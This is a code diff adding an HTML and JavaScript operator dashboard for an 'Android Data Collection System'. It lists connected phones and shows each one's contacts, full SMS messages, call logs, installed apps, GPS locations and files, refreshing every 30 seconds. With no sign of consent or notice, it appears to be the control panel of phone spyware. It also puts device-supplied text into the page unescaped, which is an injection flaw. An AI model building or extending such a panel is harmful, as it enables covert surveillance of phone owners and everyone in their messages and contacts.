@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Data Collector</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 30px;
+            background: #f5f5f5;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .stat-card h3 {
+            color: #667eea;
+            font-size: 2em;
+            margin-bottom: 5px;
+        }
+
+        .stat-card p {
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .devices-section {
+            margin-bottom: 40px;
+        }
+
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .device-card {
+            background: #f9f9f9;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .device-card:hover {
+            border-color: #667eea;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .device-card.active {
+            border-color: #667eea;
+            background: #f0f4ff;
+        }
+
+        .device-card h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .device-card p {
+            color: #666;
+            font-size: 0.9em;
+            margin: 5px 0;
+        }
+
+        .data-section {
+            display: none;
+        }
+
+        .data-section.active {
+            display: block;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab {
+            padding: 12px 24px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: all 0.3s;
+        }
+
+        .tab:hover {
+            background: #d0d0d0;
+        }
+
+        .tab.active {
+            background: #667eea;
+            color: white;
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .data-table th {
+            background: #667eea;
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        .data-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .data-table tr:hover {
+            background: #f5f5f5;
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        .search-box:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #999;
+        }
+
+        .refresh-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-bottom: 20px;
+        }
+
+        .refresh-btn:hover {
+            background: #5568d3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 Admin Dashboard</h1>
+            <p>Android Data Collection System</p>
+        </div>
+
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-card">
+                <h3 id="statDevices">0</h3>
+                <p>Devices</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="statContacts">0</h3>
+                <p>Contacts</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="statSMS">0</h3>
+                <p>SMS Messages</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="statCalls">0</h3>
+                <p>Call Logs</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="statApps">0</h3>
+                <p>Installed Apps</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="statLocations">0</h3>
+                <p>Locations</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="statFiles">0</h3>
+                <p>Files</p>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="devices-section">
+                <h2>Connected Devices</h2>
+                <div class="devices-grid" id="devicesGrid">
+                    <div class="loading">Loading devices...</div>
+                </div>
+            </div>
+
+            <div id="dataSection" class="data-section">
+                <button class="refresh-btn" onclick="loadDeviceData()">🔄 Refresh Data</button>
+                
+                <div class="tabs">
+                    <button class="tab active" onclick="showTab('contacts')">Contacts</button>
+                    <button class="tab" onclick="showTab('sms')">SMS</button>
+                    <button class="tab" onclick="showTab('calls')">Call Logs</button>
+                    <button class="tab" onclick="showTab('apps')">Installed Apps</button>
+                    <button class="tab" onclick="showTab('location')">Location</button>
+                    <button class="tab" onclick="showTab('files')">Files</button>
+                </div>
+
+                <input type="text" class="search-box" id="searchBox" placeholder="Search..." onkeyup="filterData()">
+
+                <div id="contactsTab" class="tab-content active">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Phone</th>
+                                <th>Collected At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="contactsTable"></tbody>
+                    </table>
+                </div>
+
+                <div id="smsTab" class="tab-content" style="display: none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>From</th>
+                                <th>Message</th>
+                                <th>Date</th>
+                                <th>Type</th>
+                            </tr>
+                        </thead>
+                        <tbody id="smsTable"></tbody>
+                    </table>
+                </div>
+
+                <div id="callsTab" class="tab-content" style="display: none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Number</th>
+                                <th>Type</th>
+                                <th>Date</th>
+                                <th>Duration</th>
+                            </tr>
+                        </thead>
+                        <tbody id="callsTable"></tbody>
+                    </table>
+                </div>
+
+                <div id="appsTab" class="tab-content" style="display: none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>App Name</th>
+                                <th>Package Name</th>
+                                <th>System App</th>
+                            </tr>
+                        </thead>
+                        <tbody id="appsTable"></tbody>
+                    </table>
+                </div>
+
+                <div id="locationTab" class="tab-content" style="display: none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Latitude</th>
+                                <th>Longitude</th>
+                                <th>Accuracy</th>
+                                <th>Timestamp</th>
+                            </tr>
+                        </thead>
+                        <tbody id="locationTable"></tbody>
+                    </table>
+                </div>
+
+                <div id="filesTab" class="tab-content" style="display: none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Path</th>
+                                <th>Size</th>
+                                <th>Type</th>
+                            </tr>
+                        </thead>
+                        <tbody id="filesTable"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentDeviceId = null;
+        let currentData = {};
+
+        // Load stats
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
+                
+                document.getElementById('statDevices').textContent = stats.devices || 0;
+                document.getElementById('statContacts').textContent = stats.contacts || 0;
+                document.getElementById('statSMS').textContent = stats.sms || 0;
+                document.getElementById('statCalls').textContent = stats.callLogs || 0;
+                document.getElementById('statApps').textContent = stats.apps || 0;
+                document.getElementById('statLocations').textContent = stats.locations || 0;
+                document.getElementById('statFiles').textContent = stats.files || 0;
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+
+        // Load devices
+        async function loadDevices() {
+            try {
+                const response = await fetch('/api/devices');
+                const devices = await response.json();
+                
+                const grid = document.getElementById('devicesGrid');
+                if (devices.length === 0) {
+                    grid.innerHTML = '<div class="empty-state">No devices connected yet</div>';
+                    return;
+                }
+
+                grid.innerHTML = devices.map(device => `
+                    <div class="device-card" onclick="selectDevice('${device.device_id}')">
+                        <h3>${device.model || 'Unknown Device'}</h3>
+                        <p><strong>ID:</strong> ${device.device_id}</p>
+                        <p><strong>Manufacturer:</strong> ${device.manufacturer || 'N/A'}</p>
+                        <p><strong>Android:</strong> ${device.android_version || 'N/A'}</p>
+                        <p><strong>Phone:</strong> ${device.phone_number || 'N/A'}</p>
+                        <p><strong>Last Seen:</strong> ${new Date(device.last_seen).toLocaleString()}</p>
+                    </div>
+                `).join('');
+            } catch (error) {
+                console.error('Error loading devices:', error);
+                document.getElementById('devicesGrid').innerHTML = 
+                    '<div class="empty-state">Error loading devices</div>';
+            }
+        }
+
+        // Select device
+        function selectDevice(deviceId) {
+            currentDeviceId = deviceId;
+            
+            // Update active device card
+            document.querySelectorAll('.device-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+            
+            // Show data section
+            document.getElementById('dataSection').classList.add('active');
+            
+            // Load device data
+            loadDeviceData();
+        }
+
+        // Load device data
+        async function loadDeviceData() {
+            if (!currentDeviceId) return;
+
+            try {
+                const [contacts, sms, calls, apps, location, files] = await Promise.all([
+                    fetch(`/api/device/${currentDeviceId}/contacts`).then(r => r.json()),
+                    fetch(`/api/device/${currentDeviceId}/sms`).then(r => r.json()),
+                    fetch(`/api/device/${currentDeviceId}/call-logs`).then(r => r.json()),
+                    fetch(`/api/device/${currentDeviceId}/apps`).then(r => r.json()),
+                    fetch(`/api/device/${currentDeviceId}/location`).then(r => r.json()),
+                    fetch(`/api/device/${currentDeviceId}/files`).then(r => r.json())
+                ]);
+
+                currentData = { contacts, sms, calls, apps, location, files };
+                displayCurrentTab();
+            } catch (error) {
+                console.error('Error loading device data:', error);
+            }
+        }
+
+        // Show tab
+        function showTab(tabName) {
+            // Update tab buttons
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            event.target.classList.add('active');
+
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.style.display = 'none';
+            });
+
+            // Show selected tab
+            const tabContent = document.getElementById(tabName + 'Tab');
+            if (tabContent) {
+                tabContent.style.display = 'block';
+            }
+
+            displayCurrentTab();
+        }
+
+        // Display current tab data
+        function displayCurrentTab() {
+            const activeTab = document.querySelector('.tab.active');
+            if (!activeTab) return;
+
+            const tabName = activeTab.textContent.toLowerCase().replace(' ', '');
+            
+            if (tabName === 'contacts') {
+                displayContacts();
+            } else if (tabName === 'sms') {
+                displaySMS();
+            } else if (tabName === 'calls') {
+                displayCalls();
+            } else if (tabName === 'apps') {
+                displayApps();
+            } else if (tabName === 'location') {
+                displayLocation();
+            } else if (tabName === 'files') {
+                displayFiles();
+            }
+        }
+
+        function displayContacts() {
+            const tbody = document.getElementById('contactsTable');
+            const contacts = currentData.contacts || [];
+            
+            if (contacts.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" class="empty-state">No contacts found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = contacts.map(contact => `
+                <tr>
+                    <td>${contact.name || 'N/A'}</td>
+                    <td>${contact.phone || 'N/A'}</td>
+                    <td>${new Date(contact.collected_at).toLocaleString()}</td>
+                </tr>
+            `).join('');
+        }
+
+        function displaySMS() {
+            const tbody = document.getElementById('smsTable');
+            const sms = currentData.sms || [];
+            
+            if (sms.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No SMS found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = sms.map(msg => `
+                <tr>
+                    <td>${msg.address || 'N/A'}</td>
+                    <td>${(msg.body || '').substring(0, 50)}${(msg.body || '').length > 50 ? '...' : ''}</td>
+                    <td>${new Date(parseInt(msg.date)).toLocaleString()}</td>
+                    <td>${msg.type === '1' ? 'Received' : 'Sent'}</td>
+                </tr>
+            `).join('');
+        }
+
+        function displayCalls() {
+            const tbody = document.getElementById('callsTable');
+            const calls = currentData.calls || [];
+            
+            if (calls.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No call logs found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = calls.map(call => `
+                <tr>
+                    <td>${call.number || 'N/A'}</td>
+                    <td>${getCallType(call.type)}</td>
+                    <td>${new Date(parseInt(call.date)).toLocaleString()}</td>
+                    <td>${formatDuration(call.duration)}</td>
+                </tr>
+            `).join('');
+        }
+
+        function displayApps() {
+            const tbody = document.getElementById('appsTable');
+            const apps = currentData.apps || [];
+            
+            if (apps.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" class="empty-state">No apps found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = apps.map(app => `
+                <tr>
+                    <td>${app.app_name || 'N/A'}</td>
+                    <td>${app.package_name || 'N/A'}</td>
+                    <td>${app.is_system_app ? 'Yes' : 'No'}</td>
+                </tr>
+            `).join('');
+        }
+
+        function displayLocation() {
+            const tbody = document.getElementById('locationTable');
+            const locations = currentData.location || [];
+            
+            if (locations.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No location data found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = locations.map(loc => `
+                <tr>
+                    <td>${loc.latitude || 'N/A'}</td>
+                    <td>${loc.longitude || 'N/A'}</td>
+                    <td>${loc.accuracy ? loc.accuracy.toFixed(2) + 'm' : 'N/A'}</td>
+                    <td>${new Date(parseInt(loc.timestamp)).toLocaleString()}</td>
+                </tr>
+            `).join('');
+        }
+
+        function displayFiles() {
+            const tbody = document.getElementById('filesTable');
+            const files = currentData.files || [];
+            
+            if (files.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No files found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = files.map(file => `
+                <tr>
+                    <td>${file.name || 'N/A'}</td>
+                    <td>${(file.path || '').substring(0, 50)}${(file.path || '').length > 50 ? '...' : ''}</td>
+                    <td>${formatFileSize(file.size)}</td>
+                    <td>${file.is_directory ? 'Directory' : 'File'}</td>
+                </tr>
+            `).join('');
+        }
+
+        function getCallType(type) {
+            const types = {
+                '1': 'Incoming',
+                '2': 'Outgoing',
+                '3': 'Missed'
+            };
+            return types[type] || 'Unknown';
+        }
+
+        function formatDuration(seconds) {
+            if (!seconds) return 'N/A';
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${mins}m ${secs}s`;
+        }
+
+        function formatFileSize(bytes) {
+            if (!bytes) return 'N/A';
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(1024));
+            return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
+        }
+
+        function filterData() {
+            const searchTerm = document.getElementById('searchBox').value.toLowerCase();
+            const table = document.querySelector('.tab-content[style*="block"] table tbody');
+            if (!table) return;
+
+            Array.from(table.querySelectorAll('tr')).forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(searchTerm) ? '' : 'none';
+            });
+        }
+
+        // Initialize
+        loadStats();
+        loadDevices();
+        setInterval(() => {
+            loadStats();
+            if (currentDeviceId) {
+                loadDeviceData();
+            } else {
+                loadDevices();
+            }
+        }, 30000); // Refresh every 30 seconds
+    </script>
+</body>
+</html>
